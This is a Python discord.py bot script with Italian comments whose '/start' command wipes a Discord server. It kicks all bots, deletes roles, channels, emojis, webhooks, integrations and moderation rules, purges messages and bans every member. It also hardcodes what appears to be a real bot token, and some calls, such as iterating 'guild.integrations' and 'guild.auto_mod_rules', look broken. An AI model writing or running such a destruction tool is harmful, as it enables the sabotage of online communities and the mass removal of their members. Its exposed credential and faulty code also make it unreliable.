import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True
intents.bans = True
intents.presences = True
intents.typing = True
intents.webhooks = True
intents.integrations = True

bot = commands.Bot(command_prefix='/', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
@commands.has_permissions(administrator=True)
async def start(ctx):
    guild = ctx.guild

    # Espelli tutti i bot
    for member in guild.members:
        if member.bot:
            try:
                await member.kick()
            except discord.Forbidden:
                pass

    # Elimina tutti i ruoli
    for role in guild.roles:
        if role != guild.default_role:
            try:
                await role.delete()
            except discord.Forbidden:
                pass

    # Cancella tutti i messaggi in tutti i canali
    for channel in guild.text_channels:
        try:
            await channel.purge()
        except discord.Forbidden:
            pass

    # Banna tutti i membri
    for member in guild.members:
        try:
            await member.ban()
        except discord.Forbidden:
            pass

    # Elimina tutti i canali
    for channel in guild.channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            pass

    # Elimina tutte le emoji personalizzate
    for emoji in guild.emojis:
        try:
            await emoji.delete()
        except discord.Forbidden:
            pass

    # Elimina tutti i webhook
    for channel in guild.text_channels:
        webhooks = await channel.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete()
            except discord.Forbidden:
                pass

    # Elimina tutte le integrazioni
    for integration in guild.integrations:
        try:
            await integration.delete()
        except discord.Forbidden:
            pass

    # Elimina tutte le regole di moderazione
    for auto_mod_rule in guild.auto_mod_rules:
        try:
            await auto_mod_rule.delete()
        except discord.Forbidden:
            pass

    await ctx.send("Pulizia completata.")

# Sostituisci 'your_token_here' con il tuo token del bot
bot.run('MTM0ODc4NjI0MzYwNTEwNjc5OA.GpAE8O.qePd4FAoZPUwDoBaMjIUJihe67VQHT7R0HNptE')
